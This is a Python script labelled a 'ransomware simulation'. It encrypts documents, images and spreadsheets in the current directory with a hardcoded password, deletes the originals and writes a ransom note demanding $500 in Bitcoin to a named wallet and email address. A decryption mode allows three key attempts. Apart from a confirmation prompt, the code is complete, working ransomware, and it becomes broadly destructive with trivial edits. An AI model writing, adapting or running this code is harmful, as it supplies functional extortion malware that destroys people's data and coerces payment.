import os
import base64
import getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Configuration - Now targets current directory safely
TARGET_DIRS = ["."]  # Encrypt files in current directory
FILE_EXTENSIONS = ['.txt', '.doc', '.xls', '.jpg', '.png', '.pdf', '.csv']
SALT = b'rans0m_salt_!@#$'  # For key derivation
RANSOM_NOTE = """
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

To recover your files, you MUST:
1. Send $500 USD in Bitcoin to: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq
2. Email proof of payment to: ransom.recovery@proton.me
3. Run this program again with the decryption key

Your unique decryption key will be provided after payment verification.

WARNING:
- Any attempt to modify files will cause permanent data loss
- Decryption without key is IMPOSSIBLE
- After 72 hours, all files will be permanently destroyed
"""

# Hardcoded decryption key
DECRYPTION_KEY = "Abhishek!234@#$"

def derive_key(password):
    """Derive encryption key from password"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=100000
    )
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

def encrypt_file(path, fernet):
    """Encrypt a file and replace original"""
    try:
        # Skip the script itself
        if path == os.path.abspath(__file__):
            return False
            
        with open(path, 'rb') as f:
            data = f.read()
        
        encrypted_data = fernet.encrypt(data)
        with open(path + '.encrypted', 'wb') as f:
            f.write(encrypted_data)
        
        os.remove(path)
        return True
    except Exception:
        return False

def decrypt_file(path, fernet):
    """Decrypt a file and restore original"""
    try:
        with open(path, 'rb') as f:
            data = f.read()
        
        decrypted_data = fernet.decrypt(data)
        original_path = path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        
        os.remove(path)
        return True
    except Exception:
        return False

def process_files(mode, password):
    """Encrypt/decrypt files in target directories"""
    try:
        key = derive_key(password)
        fernet = Fernet(key)
    except:
        return 0, 0  # Key derivation failure

    total_files = 0
    success_count = 0

    for target_dir in TARGET_DIRS:
        if not os.path.exists(target_dir):
            continue
            
        for root, _, files in os.walk(target_dir):
            for file in files:
                full_path = os.path.join(root, file)
                
                # Encryption mode
                if mode == 'encrypt':
                    if any(file.endswith(ext) for ext in FILE_EXTENSIONS) and not file.endswith('.encrypted'):
                        total_files += 1
                        if encrypt_file(full_path, fernet):
                            success_count += 1
                
                # Decryption mode
                elif mode == 'decrypt' and file.endswith('.encrypted'):
                    total_files += 1
                    if decrypt_file(full_path, fernet):
                        success_count += 1

    return total_files, success_count

def create_ransom_notes():
    """Create ransom notes in all target directories"""
    for target_dir in TARGET_DIRS:
        if os.path.exists(target_dir):
            note_path = os.path.join(target_dir, '!!!READ_ME!!!.txt')
            with open(note_path, 'w') as f:
                f.write(RANSOM_NOTE)

def show_ransom_note():
    """Display ransom note with payment instructions"""
    print("\n" + "="*80)
    print(RANSOM_NOTE)
    print("="*80 + "\n")
    print(">> Your files are UNUSABLE until you pay and enter the decryption key <<\n")

def any_encrypted_files():
    """Check if encrypted files exist in target directories"""
    for target_dir in TARGET_DIRS:
        if not os.path.exists(target_dir):
            continue
        for root, _, files in os.walk(target_dir):
            if any(f.endswith('.encrypted') for f in files):
                return True
    return False

def main():
    """Main ransomware simulation"""
    # Encryption mode
    if not any_encrypted_files():
        print("Starting file encryption...")
        total, success = process_files('encrypt', DECRYPTION_KEY)
        create_ransom_notes()
        show_ransom_note()
        print(f"Encrypted {success}/{total} files in current directory")
        print("\nRun this program again to enter decryption key after payment\n")
        return

    # Decryption mode
    show_ransom_note()
    attempts = 3
    while attempts > 0:
        key_attempt = getpass.getpass(f"Enter decryption key ({attempts} attempts remaining): ")
        
        total, success = process_files('decrypt', key_attempt)
        if success > 0:
            print(f"\nDecrypted {success}/{total} files")
            
            # Full recovery
            if not any_encrypted_files():
                print("\nFULL RECOVERY SUCCESSFUL! Your files have been restored.")
                # Remove ransom notes
                for target_dir in TARGET_DIRS:
                    note_path = os.path.join(target_dir, '!!!READ_ME!!!.txt')
                    if os.path.exists(note_path):
                        os.remove(note_path)
                return
            else:
                print("Partial recovery - some files remain encrypted")
        else:
            print("DECRYPTION FAILED! Invalid key or corrupted files")
            attempts -= 1

    print("\nPERMANENT DATA LOSS! Send payment immediately to recover files")

if __name__ == "__main__":
    # Important safety checks
    script_name = os.path.basename(__file__)
    print(f"Running ransomware simulation ({script_name}) - Files in current directory will be encrypted!")
    
    # Skip encryption if already encrypted files present
    if any_encrypted_files():
        print("Encrypted files detected - entering decryption mode")
        main()
    else:
        confirm = input("Type 'ENCRYPT' to start file encryption: ")
        if confirm.strip().upper() == 'ENCRYPT':
            main()
        else:
            print("Encryption cancelled")
